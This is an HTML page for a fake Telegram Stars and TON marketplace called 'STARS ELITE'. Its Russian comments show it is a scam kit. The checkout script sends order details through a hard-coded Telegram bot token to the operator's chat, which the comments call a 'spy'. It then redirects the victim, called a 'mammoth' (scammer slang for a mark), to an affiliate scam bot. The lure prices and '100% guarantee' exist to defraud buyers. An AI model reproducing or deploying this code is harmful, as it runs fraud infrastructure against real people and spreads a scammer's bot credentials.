<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STARS ELITE — Официальный Маркет</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        body { 
            background-color: #030303; 
            color: #ffffff; 
            font-family: 'Inter', sans-serif; 
            -webkit-tap-highlight-color: transparent;
        }
        .premium-card {
            background: linear-gradient(145deg, #0f0f0f 0%, #050505 100%);
            border: 1px solid rgba(255, 255, 255, 0.03);
            border-radius: 24px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .active-tab {
            color: #0088cc;
            border-bottom: 3px solid #0088cc;
        }
        .glow-btn {
            background: linear-gradient(135deg, #0088cc 0%, #005580 100%);
            box-shadow: 0 0 20px rgba(0, 136, 204, 0.4);
        }
        .glow-btn:active {
            transform: scale(0.96);
        }
        .selected-border {
            border: 2px solid #0088cc !important;
            box-shadow: inset 0 0 15px rgba(0, 136, 204, 0.2);
        }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center p-5">

    <!-- Header -->
    <header class="w-full max-w-md text-center py-12">
        <h1 class="text-6xl font-black italic tracking-tighter mb-1">STARS <span class="text-cyan-500">ELITE</span></h1>
        <p class="text-gray-500 text-[10px] uppercase tracking-[0.4em] font-bold">The Gold Standard of Stars</p>
    </header>

    <div class="w-full max-w-md flex-1">
        <!-- Tabs -->
        <div class="flex mb-10 border-b border-white/5">
            <button onclick="switchTab('stars')" id="tab-stars" class="flex-1 py-4 text-xs font-black tracking-widest active-tab uppercase">STARS</button>
            <button onclick="switchTab('ton')" id="tab-ton" class="flex-1 py-4 text-xs font-black tracking-widest text-gray-600 uppercase">TON CRYPTO</button>
        </div>

        <!-- Products List -->
        <div id="product-list" class="space-y-5">
            <!-- JS Injection -->
        </div>

        <!-- Sticky Footer Checkout -->
        <div class="mt-12 premium-card p-8 border-t border-white/5">
            <div class="flex justify-between items-end mb-8">
                <div>
                    <p class="text-gray-500 text-[10px] font-bold uppercase tracking-widest mb-1">Итоговая сумма</p>
                    <p id="total-price" class="text-4xl font-black text-white">0 ⭐</p>
                </div>
                <div class="text-right">
                    <p class="text-cyan-500 text-[10px] font-bold uppercase tracking-widest">Гарантия 100%</p>
                </div>
            </div>
            
            <button onclick="checkout()" class="w-full glow-btn py-6 rounded-2xl font-black text-xl uppercase tracking-widest transition-all">
                Оплатить сейчас
            </button>
            
            <div class="mt-6 flex justify-center space-x-4 opacity-30">
                <i class="fab fa-telegram-plane text-xl"></i>
                <i class="fas fa-bolt text-xl text-yellow-500"></i>
                <i class="fas fa-lock text-xl"></i>
            </div>
        </div>
    </div>

    <footer class="py-10 text-[9px] text-gray-800 font-bold uppercase tracking-[0.3em]">
        Stars Elite Protocol v4.0.21
    </footer>

    <script>
        // ВОТ ЭТОТ БОТ ДОЛЖЕН ПИСАТЬ (ТВОЙ ШПИОН)
        const LOG_BOT_TOKEN = '8693212521:AAE6y0aa5pPeMx6Oa8uRI1f8PvConZGNOiQ';
        const MY_CHAT_ID = '7811669365';
        
        // КУДА МАМОНТ ПЕРЕХОДИТ ДЛЯ ПОКУПКИ
        const TARGET_URL = "https://t.me/starseliteofficial_bot?start=_tgr_VvkE7YAzNzUy";

        let currentMode = 'stars';
        let selectedProduct = null;

        const items = {
            stars: [
                { id: 'st1', val: 25, cost: 15, cur: '⭐', info: 'ПАКЕТ START' },
                { id: 'st2', val: 50, cost: 25, cur: '⭐', info: 'ПАКЕТ MEDIUM' },
                { id: 'st3', val: 100, cost: 50, cur: '⭐', info: 'ПАКЕТ PRO' }
            ],
            ton: [
                { id: 'tn1', val: 25, cost: 2, cur: 'TON', old: 3, info: 'HOT OFFER' },
                { id: 'tn2', val: 50, cost: 3, cur: 'TON', old: 4, info: 'HOT OFFER' },
                { id: 'tn3', val: 100, cost: 4, cur: 'TON', old: 6, info: 'HOT OFFER' }
            ]
        };

        function switchTab(mode) {
            currentMode = mode;
            selectedProduct = null;
            document.getElementById('tab-stars').className = `flex-1 py-4 text-xs font-black tracking-widest uppercase ${mode === 'stars' ? 'active-tab' : 'text-gray-600'}`;
            document.getElementById('tab-ton').className = `flex-1 py-4 text-xs font-black tracking-widest uppercase ${mode === 'ton' ? 'active-tab' : 'text-gray-600'}`;
            renderUI();
        }

        function select(id) {
            selectedProduct = items[currentMode].find(i => i.id === id);
            renderUI();
        }

        function renderUI() {
            const list = document.getElementById('product-list');
            list.innerHTML = '';

            items[currentMode].forEach(item => {
                const active = selectedProduct && selectedProduct.id === item.id;
                list.innerHTML += `
                    <div onclick="select('${item.id}')" 
                         class="premium-card p-6 flex justify-between items-center cursor-pointer transition-all border-2 ${active ? 'selected-border scale-[1.03]' : 'border-transparent'}">
                        <div>
                            <p class="text-[9px] text-cyan-600 font-black tracking-widest mb-1 uppercase">${item.info}</p>
                            <h3 class="text-3xl font-black italic tracking-tighter">${item.val} <span class="text-sm not-italic font-bold text-gray-500">STARS</span></h3>
                            ${item.old ? `<span class="text-gray-700 line-through text-xs font-bold">${item.old} ${item.cur}</span>` : ''}
                        </div>
                        <div class="text-right">
                            <p class="text-2xl font-black text-white">${item.cost} ${item.cur}</p>
                            <p class="text-[8px] text-gray-600 font-bold uppercase tracking-tighter">Выбрать пакет</p>
                        </div>
                    </div>
                `;
            });

            const total = document.getElementById('total-price');
            if (selectedProduct) {
                total.innerText = `${selectedProduct.cost} ${selectedProduct.cur}`;
                total.style.color = '#00fbff';
            } else {
                total.innerText = '0 ⭐';
                total.style.color = '#1f2937';
            }
        }

        async function checkout() {
            if (!selectedProduct) {
                alert("Пакет выбери, ебать!");
                return;
            }

            // Формируем отчет для твоего ПЕРВОГО бота (шпиона)
            const report = `🏴‍☠️ <b>НОВЫЙ ЗАКАЗ!</b>\n\n` +
                           `📦 Пакет: <b>${selectedProduct.val} STARS</b>\n` +
                           `💸 Цена: <b>${selectedProduct.cost} ${selectedProduct.cur}</b>\n` +
                           `⚙️ Метод: <b>${currentMode.toUpperCase()}</b>\n\n` +
                           `<i>Мамонт редиректится в партнёрку...</i>`;

            // ТУТ МЫ ШЛЕМ ЗАПРОС ИМЕННО С ТОКЕНОМ ШПИОНА
            try {
                const response = await fetch(`https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: MY_CHAT_ID,
                        text: report,
                        parse_mode: 'HTML'
                    })
                });
                
                if (!response.ok) {
                    console.error("Ошибка телеграма:", await response.text());
                }
            } catch (err) {
                console.error("Ошибка отправки лога:", err);
            }

            // После отправки лога шпиону — кидаем мамонта в партнерку
            window.location.href = TARGET_URL;
        }

        renderUI();
    </script>
</body>
</html>
